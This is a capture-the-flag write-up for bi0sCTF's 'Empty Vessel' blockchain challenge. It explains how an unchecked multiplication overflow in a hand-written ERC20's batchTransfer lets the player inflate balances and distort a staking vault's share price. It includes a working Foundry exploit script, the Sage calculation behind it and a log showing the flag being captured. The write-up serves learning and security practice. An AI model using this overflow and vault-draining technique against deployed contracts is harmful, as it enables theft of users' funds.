# Write-Up

This year at bi0sCTF, they pulled a little surprise outta their hat: blockchain challenges. Not gonna lie, thats an exciting news. I'm usually grinding crypto (and sometimes poking at reverse for the lolz) because no blockchain :(. But this time that was different, and I had a day or two to spare, so I figured hey—why not take this thing for a spin? Turns out it was a pretty nice side quest.

So, here’s how I approached the chall `Empty Vessel`.

## Provided Files

Accessible [here](./chall)

```sh
├── script
│   ├── Deploy.s.sol
├── src
│   ├── INR.sol
│   ├── openzeppelin-contracts
│   ├── Setup.sol
│   └── Stake.sol
└── makefile
```

## First stop: Deployment

Whenever there's a smart contract challenge, I like to start by peeking at the deployment script. It gives you the big picture. What’s being deployed? In what order? Are there interactions right after deployment that might set the scene for the exploit?

In this case, the `Deploy.s.sol` script does creates the `Setup` contract. That's all, lol.

Now, the real setup logic? That’s where `Setup.sol` comes in.

## Second stop: Setup.sol

This `Setup` contract is doing a few interesting things:

* At deployment:

  * It creates a new `INR` token with a total supply of `stakeAmount + bonusAmount`, respectively `100_000e18 + 1_746_230_400`.
  * Then it deploys a new `Stake` contract and passes it:
    * the INR token instance
    * `100_000e18` for `uint256 _maxDeposit`
    * `100_000e18` for `uint256 _maxMint`

### Let’s break down the functions:

* `claim()`

  * Only callable once (enforced via `claimed`)
  * Transfers `bonusAmount` (1746230400 INR) to `msg.sender` — this is how **we** get some lil' tokens

* `stakeINR()`

  * Approves the stake contract to spend `stakeAmount` worth of INR (so, 100k)
  * Then deposits that amount **from the `Setup` contract itself**, not from us
  * Sets `staked = true`

* `solve()`

  * Can only be called after `stakeINR()` has been called (enforced by `staked`)
  * Calls `redeemAll()` on the `stake` contract (again, from `Setup`'s own perspective)
  * If that redeem gives back **more than 75k INR**, the challenge fails
  * Otherwise, we win

What this means is:

* We get 1746230400 INR with `claim()`
* We can then play with `Stake` and `INR` freely
* But the challenge will **only be solved** when the `Setup` contract manages to stake and redeem 100k INR, **and** get back ≤75k INR.

So now there’s a double dimension:

1. How can we abuse the `Stake`/`INR` system to rug the value of what Setup gets back?
2. What mischief can we do with our massive 1746230400 INR supply?

## Overview: `Stake.sol`

Alright let’s keep rollin’—time to zoom in on `Stake.sol`.

Here’s the vibe: this contract is a custom staking mechanism, where you deposit `INR` tokens, and in return you receive **shares**. These shares represent your portion of the overall pool. Later, you can redeem your shares to get back `INR`, based on the current pool balance.

Sound familiar? Yep, it's basically a simplified version of an [ERC4626-style vault](https://eips.ethereum.org/EIPS/eip-4626)—with some twists.

### Let's walk through the core logic:

You can deposit INR in two ways:

1. `deposit(amount, receiver)` – you say how many **tokens** you want to give, and get shares in return
2. `mint(shares, receiver)` – you say how many **shares** you want, and it figures out how many tokens to take

They both:

* enforce your remaining deposit allowance (`MAX_DEPOSIT - deposits[msg.sender]`)
* do the share/asset math via `convertToShares()` or `convertToAssets()`
* call `inr.transferFrom(...)` to actually pull tokens from you
* mint vINR shares to your wallet

So far so good.

But crucially, this math is all based on:

```solidity
convertToShares = (assets * totalSupply()) / totalAssets();
```

and vice versa:

```solidity
convertToAssets = (shares * totalAssets()) / totalSupply();
```

Which means the **value of a share is dynamic** and based entirely on the INR balance the contract currently holds.

Okey, seems like a classical vault setup that's fine.. Or is it? (spoiler: [**yes** no maybe, I don't know](https://www.youtube.com/watch?v=c4CVKbVtTsc))

### The flaw

Here's the key insight:

> The contract **assumes that `inr.balanceOf(address(this))` is honest** and reflects real, non-manipulated value.

But this is the weak spot. If we can **artificially inflate or deflate** the vault's INR balance **without updating share supply accordingly**, we can rug the pool—or pump our shares—for profit (or sabotage).

This suggests the real trick is gonna come from the `INR` contract. If it does something funky like:

* Let us change balances arbitrarily
* Hook or break on `transferFrom` / `transfer`

...then we can totally mess with the share pricing mechanism here.

## Overview: `INR.sol`

Time to dig in.

Alright so before I even touch the code: yeah—I had to **reverse** this beast since `INR` is a cursed hand-written ERC20 with assembly voodoo.

> This isn’t our comfy OpenZeppelin ERC20. No `SafeMath`, no clean public view functions, no NatSpec doc—**just raw Yul assembly** doing funky slot tricks. So I took the time to annotate it, dig through the memory ops, and figure out what’s *really* happening here.

[Here is the full annoted code](./chall/src/INR.sol)

### First impressions

It *claims* to be an ERC20. And yeah, it kinda is. You’ve got:

* `balanceOf`, `transfer`, `approve`, `transferFrom`
* A `totalSupply()` getter
* A `mint` and `burn`, gated by `onlyOwner`

But under the hood, the logic is completely hand-rolled using inline assembly, and that opens the door for subtle (or not-so-subtle) bugs.

Oh—and it comes with a bonus **`batchTransfer()`** function that’s not part of the ERC20 spec, and not used anywhere in the challenge setup. Suspicious? Yup as fuck. Let’s hold that thought.

### Storage layout (kinda guessed after reversing)

From the assembly in the constructor, we can reconstruct the storage layout:

| Slot | Purpose                                                                |
| ---- | ---------------------------------------------------------------------- |
| `0`  | Owner address                                                          |
| `1`  | `balances` mapping (via `keccak256(addr, 1)`)                          |
| `2`  | `allowances` mapping (via nested keccak256 using slot 2 for allowance) |
| `3`  | `totalSupply`                                                          |
| `4`  | `name` (but only first 32 bytes)                                       |
| `5`  | `symbol` (but set weirdly—probably garbage)                            |

It also hard-reverts if the `name` or `symbol` strings are longer than 32 bytes. Hilarious.

### The good (normal) stuff

* **`transfer`** and **`transferFrom`** both check balances, then do storage updates. They're fairly standard and *should* be safe.
* **`mint`** and **`burn`** are owner-only, and directly touch balances and `totalSupply`.

So far, so boring. But then...

### The spicy meatball: `batchTransfer()`

Let’s look at this in plain English:

```solidity
function batchTransfer(address[] memory receivers, uint256 amount)
```

* It checks that the caller has *some* balance (but not how much! Just that it’s non-zero)
* Then it computes `amount * receivers.length` and ensures the caller has *at least* that much balance
* Then it loops over all the `receivers[]` and adds `amount` to each of their balances
* Finally, it subtracts the total from caller’s balance

Sounds okay, right?

> Wrong.

### The broken assumption: multiplication overflow

Here’s the **(lonely one)** check on the amount requested to transfer:

```solidity
if (callerBalance < amount * receivers.length) revert
```

But the multiplication is done **without checking for overflow**.

So we can do this:

```solidity
amount = 2**256 / len + 1
receivers.length = len
=> amount * len = 1 (mod 2^256) == low number
```

Now let’s weaponize it.

## Weaponization

### My first baaaad idea

At first, I thought I could get clever and mess with the `calldata` manually—like literally crafting a fake `receivers.length` that’s huge, so I could underflow the multiplication check in `batchTransfer()`. The idea was: keep `amount` small, and abuse the overflow on `amount * length` to make it pass the balance check. But realistically? That’s just a one-way trip to **out-of-gas hell**, especially if you're looping through a massive array.

### Second thought

Instead of going wild with calldata length hacks or overflow stunts, I just abused the fact that `batchTransfer()` lets me set **any `amount` I want**. No checks, no questions. I picked a huge `amount`, crafted a tiny `receivers[]`, and inflated my balance. Then, when Setup did its usual `stakeINR()` routine, it deposited 100k INR into a vault with success. insert :emoji_fire:

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/Setup.sol";
import {Stake} from "src/Stake.sol";
import {INR} from "src/INR.sol";


contract Exploit is Script {
    address badDude;

    function run() public {
        Setup setup = Setup(0x5FbDB2315678afecb367f032d93F642f64180aa3); // local addr
        Stake stake = Stake(setup.stake());
        INR inr = INR(setup.inr());

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        badDude = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        setup.claim();
        uint256 amount = type(uint256).max / 2 + 1;
        address[] memory receivers = new address[](2); // we don't need the last address that is just to overflow
        receivers[0] = address(badDude); 
        receivers[1] = address(0);

        inr.batchTransfer(receivers, amount); 
        inr.approve(address(stake), inr.balanceOf(badDude));

        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(), "nah plz ctf god, enlight me! what's wrong my lil' boi");

        vm.stopBroadcast();
    }
}
```

**But.**

```sh
    │   │   ├─ emit Transfer(from: 0x5FbDB2315678afecb367f032d93F642f64180aa3, to: 0x0000000000000000000000000000000000000000, value: 100000000000000000000000 [1e23])
    │   │   ├─ [1323] 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be::transfer(0x5FbDB2315678afecb367f032d93F642f64180aa3, 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   └─ ← [Revert] Setup__Chall__Unsolved()
    └─ ← [Revert] Setup__Chall__Unsolved()
```

There was a tiny hiccup.

I, uh… forgot to read the `solve()` function *properly*. It checks:

```solidity
if (assetsReceived > 75_000 ether) revert;
```

I thought it was the other way around and expected a **big** redeem to win. So yeah, when Setup called `redeemAll()`, it got *back* exactly 100k INR... and immediately reverted with `Setup__Chall__Unsolved()`.

Oupsie.

### Third thought (lol, as we said "never two without three" ig)

Instead of going full caveman mode and picking some monstrous `amount` like in the first exploit, here I decided to take the **math finesse** route. The core idea is simple: 

- I remembered—`Stake`'s `totalAssets()` just blindly trusts `INR.balanceOf(address(this))`, and since `INR` is all in inline assembly, it's totally vulnerable to overflows. So I figured, why not just **yeet** a ridiculous amount of INR tokens straight into `Stake` until that balance overflows? And yeah, after being traumatized by that damn `Setup__Chall__Unsolved` revert earlier, I wasn’t taking any chances—I overflowed it *hard*, like to the point where `redeemAll()` gives back exactly **1 wei**. Just to be petty.

- And also, in `batchTransfer`, I still need to mess with this check:

```solidity
if (callerBalance < amount * receivers.length) revert;
```

But as explained previously, because we're in Solidity, that multiplication is done in **`uint256`**, meaning it **overflows silently in Yul**. That’s our way in.

So rather than trying to guess a value that wraps nicely, I used Sage to compute something clean. What I wanted was:

$$
\text{amount} \times \text{length} \equiv 1 \mod 2^{256}
$$

With `length = 3` (to send to both me and the Stake), I just computed the modular inverse of 3 (3 is co-prime to $2^{256}$ then its inverse exists) in the field $\mathbb{F}_{2^{256}}$. That field wraps exactly like `uint256` does in the EVM.

In Sage:

```python
F = Zmod(2**256)
amount = F(3)**-1
```

And boom—we get a nice number such that `amount * 3 == 1 mod 2**256`.

So when the contract multiplies `amount * 3`, it sees just `1`, which is definitely smaller than our balance, and the check passes. Meanwhile, the **real** transfer is sending a **huge** amount—because in full 256-bit space, that inverse is massive.

Once that’s done, I just airdrop:

* `amount` to myself
* and `amount` twice to the `Stake` contract

Now `INR.balanceOf(stake)` shows `2 * amount`, even though no one minted shares for that.

Then I send a tiny bit more manually to `stake` so that after `setup.stakeINR()` deposits `100_000` INR, the total vault balance is cleanly aligned at `3 * amount`. That way, when `redeemAll()` runs, the share price is **garbage** and Setup gets rugged hard—returning 1 wei ≤ 75k INR, and triggering the win condition.

Simple math, clean overflow, and one beautifully scuffed ERC20.

```sh
ectario@pwnMachine:~ » nc 5s9eqjpk.eng.run 8987                                                   130 ↵


Available Options:
╔══════════════════════════════════════╗
║1. Get instance details               ║
║2. Get flag                           ║
╚══════════════════════════════════════╝

Enter your choice (1-2): 1

Hang tight! Your instance is being created...

╔════════════════════════════════════════════════════════════════════════════════╗
║                                INSTANCE DETAILS                                ║
╠════════════════════════════════════════════════════════════════════════════════╣
║ setup      : 0x4ba1e84c779063dd1E0180BE90231FF30424D8B0                        ║
║ player     : 0x49b65ac42D25bdf4D4D372f0E237e58Ba5B46822                        ║
║ player_pk  : 0x291f3545d3bb51d187bcecd062f99a6adae1a79547562caad725f236a2a893b6║
║ rpc_url    : rpc.eng.run:8926                                                  ║
╚════════════════════════════════════════════════════════════════════════════════╝

ectario@pwnMachine:~/ctf/biosctf/2025/blockchain/empty-vessel-chall-files/my_setup(master⚡) » forge script script/Exploit.s.sol:Exploit --rpc-url http://rpc.eng.run:8926 -vvvv --broadcast --private-key $PRIVATE_KEY

ectario@pwnMachine:~ » nc 5s9eqjpk.eng.run 8987


Available Options:
╔══════════════════════════════════════╗
║1. Get instance details               ║
║2. Get flag                           ║
╚══════════════════════════════════════╝

Enter your choice (1-2): 2

🏁: bi0sctf{tx:0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f}
```

## Full Exploit

`amount.py`:

```py
from sage.all import *

F = Zmod(2**256)
# length * amount = 1 % 2**256
# <=> if length = 3 then amount = inverse(3) mod 2**256
amount = F(3)**-1
length = 3
print(amount)
print(F(length) * F(amount) == 1)
```

`Exploit.sol`:

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/Setup.sol";
import {Stake} from "src/Stake.sol";
import {INR} from "src/INR.sol";


contract Exploit is Script {
    address badDude;

    function run() public {
        Setup setup = Setup(0x5FbDB2315678afecb367f032d93F642f64180aa3); // local addr
        Stake stake = Stake(setup.stake());
        INR inr = INR(setup.inr());

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        badDude = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        setup.claim();
        // see amount.py to see how to get this value
        uint256 amount = 77194726158210796949047323339125271902179989777093709359638389338608753093291;
        address[] memory receivers = new address[](3);
        receivers[0] = address(badDude); // let's receive 77194726158210796949047323339125271902179989777093709359638389338608753093291 tokens
        // sending to stake 2 * amount so INR.balanceOf(stake) = 2 * amount
        receivers[1] = address(address(stake));
        receivers[2] = address(address(stake));

        inr.batchTransfer(receivers, amount); // now INR.balanceOf(badDude) == amount and INR.balanceOf(stake) = 2 * amount
        inr.approve(address(stake), inr.balanceOf(badDude));
        inr.transfer(address(stake), amount - 100_000 ether); // to get the ratio OK in the solve condition (using overflow), the -100_000 ether is for the stakeAmount

        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(), "nah plz ctf god, enlight me! what's wrong my lil' boi");

        vm.stopBroadcast();
    }
}
```